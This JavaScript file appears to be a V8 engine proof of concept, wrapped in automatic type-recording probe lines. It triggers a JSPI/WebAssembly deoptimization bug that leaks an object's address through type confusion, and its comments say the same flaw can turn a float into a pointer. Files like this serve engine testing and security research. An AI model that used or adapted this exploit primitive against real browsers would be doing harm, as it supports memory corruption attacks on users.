var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
/// Flags: --experimental-wasm-jspi

//Set up the WASM module
//It simply consists of a stub which calls a JavaScript callback
let callback = () => {}; //just a noop for now
try { if (Inst0 <= 1000 && typeof (callback) != "undefined") {_RecordType("<135,143,5>",(callback)); Inst0++; } } catch(e) {}

/*
(module
    (import "js" "jscb" (func $jscb))
    (func (export "stub") call $jscb)
)
*/
try { if (Inst2 <= 1000 && typeof (WebAssembly.Module) != "undefined") {_RecordType("<298,316,13>",(WebAssembly.Module)); Inst2++; } } catch(e) {}try { if (Inst3 <= 1000 && typeof (WebAssembly) != "undefined") {_RecordType("<298,309,13>",(WebAssembly)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (Uint8Array) != "undefined") {_RecordType("<321,331,13>",(Uint8Array)); Inst4++; } } catch(e) {}
let wasm_mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,11,1,2,106,115,4,106,115,99,98,0,0,3,2,1,0,7,8,1,4,115,116,117,98,0,1,10,6,1,4,0,16,0,11]))
try { if (Inst1 <= 1000 && typeof (wasm_mod) != "undefined") {_RecordType("<283,291,13>",(wasm_mod)); Inst1++; } } catch(e) {}
try { if (Inst6 <= 1000 && typeof (WebAssembly.Instance) != "undefined") {_RecordType("<482,502,14>",(WebAssembly.Instance)); Inst6++; } } catch(e) {}try { if (Inst7 <= 1000 && typeof (WebAssembly) != "undefined") {_RecordType("<482,493,14>",(WebAssembly)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (wasm_mod) != "undefined") {_RecordType("<503,511,14>",(wasm_mod)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (callback) != "undefined") {_RecordType("<551,559,16>",(callback)); Inst9++; } } catch(e) {}
let wasm_inst = new WebAssembly.Instance(wasm_mod, {
    "js": {
        "jscb": () => callback()
    }
});
try { if (Inst5 <= 1000 && typeof (wasm_inst) != "undefined") {_RecordType("<466,475,14>",(wasm_inst)); Inst5++; } } catch(e) {}

//Create an array with a stable map
//The default PACKED_DOUBLE_ELEMENTS map does not get marked as stable, so fork the map by adding a new property
const array = [12.34];
try { if (Inst10 <= 1000 && typeof (array) != "undefined") {_RecordType("<734,739,22>",(array)); Inst10++; } } catch(e) {}
array.fork_map = 1337;
try { if (Inst11 <= 1000 && typeof (array.fork_map) != "undefined") {_RecordType("<752,766,23>",(array.fork_map)); Inst11++; } } catch(e) {}try { if (Inst12 <= 1000 && typeof (array) != "undefined") {_RecordType("<752,757,23>",(array)); Inst12++; } } catch(e) {}

//The function which we'll deoptimize later
try { if (Inst13 <= 1000 && typeof (deopt_target) != "undefined") {_RecordType("<832,844,26>",(deopt_target)); Inst13++; } } catch(e) {}
function deopt_target() {
    //Call the JS callback on a different WASM stack
    //Any (lazy) deoptimization triggered by this stub + callback won't detect this call-frame on the stack!
try { if (Inst14 <= 1000 && typeof (WebAssembly.promising) != "undefined") {_RecordType("<1018,1039,29>",(WebAssembly.promising)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (WebAssembly) != "undefined") {_RecordType("<1018,1029,29>",(WebAssembly)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (wasm_inst.exports.stub) != "undefined") {_RecordType("<1040,1062,29>",(wasm_inst.exports.stub)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (wasm_inst.exports) != "undefined") {_RecordType("<1040,1057,29>",(wasm_inst.exports)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (wasm_inst) != "undefined") {_RecordType("<1040,1049,29>",(wasm_inst)); Inst18++; } } catch(e) {}
    WebAssembly.promising(wasm_inst.exports.stub)();

    //This array access becomes a HeapConstant + a dependency on the stable array map, without any emitted map checks
    //The result is that the array is still assumed to contain doubles, even if the elements kind has transitioned since then
try { if (Inst19 <= 1000 && typeof (array[0]) != "undefined") {_RecordType("<1327,1335,33>",(array[0])); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (array) != "undefined") {_RecordType("<1327,1332,33>",(array)); Inst20++; } } catch(e) {}
    return array[0];
}

//Optimize the method using TurboFan
//This bakes the array access's assumptions into the assembly code, enforced through lazy deoptimizations
(function() {
    //This is required to prevent the method from being inlined and never reaching TurboFan
try { if (Inst21 <= 1000 && typeof (disable_opts) != "undefined") {_RecordType("<1609,1621,40>",(disable_opts)); Inst21++; } } catch(e) {}
    function disable_opts() {}
try { if (Inst22 <= 1000 && typeof (disable_opts) != "undefined") {_RecordType("<1632,1644,41>",(disable_opts)); Inst22++; } } catch(e) {}
    disable_opts(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);

try { if (Inst26 <= 1000 && typeof (deopt_target) != "undefined") {_RecordType("<2285,2297,43>",(deopt_target)); Inst26++; } } catch(e) {}
    for(let i = 0; i < 10000; i++) deopt_target();
try { if (Inst23 <= 1000 && typeof (i) != "undefined") {_RecordType("<2262,2263,43>",(i)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (i) != "undefined") {_RecordType("<2269,2270,43>",(i)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (i) != "undefined") {_RecordType("<2280,2281,43>",(i)); Inst25++; } } catch(e) {}
})();

//Change the callback to one which changes the array's map
//This will trigger a deoptimization of `deopt_target` once called, since the array map is no longer stable
callback = () => array[0] = "foo";
try { if (Inst27 <= 1000 && typeof (callback) != "undefined") {_RecordType("<2480,2488,48>",(callback)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (array[0]) != "undefined") {_RecordType("<2497,2505,48>",(array[0])); Inst28++; } } catch(e) {}try { if (Inst29 <= 1000 && typeof (array) != "undefined") {_RecordType("<2497,2502,48>",(array)); Inst29++; } } catch(e) {}

//Call deopt_target to trigger the bug
//This will change the array map to PACKED_ELEMENTS without the optimized code being deoptimized, since the transition happens on a separate WASM stack
//As such we interpret the pointer to the above string as a float, leaking its address
//It is also easy to cause type confusion in the opposite direction, interpreting an arbitrary float as a tagged pointer
try { if (Inst30 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<2921,2932,54>",(console.log)); Inst30++; } } catch(e) {}try { if (Inst31 <= 1000 && typeof (console) != "undefined") {_RecordType("<2921,2928,54>",(console)); Inst31++; } } catch(e) {}try { if (Inst32 <= 1000 && typeof (deopt_target) != "undefined") {_RecordType("<2933,2945,54>",(deopt_target)); Inst32++; } } catch(e) {}
console.log(deopt_target());
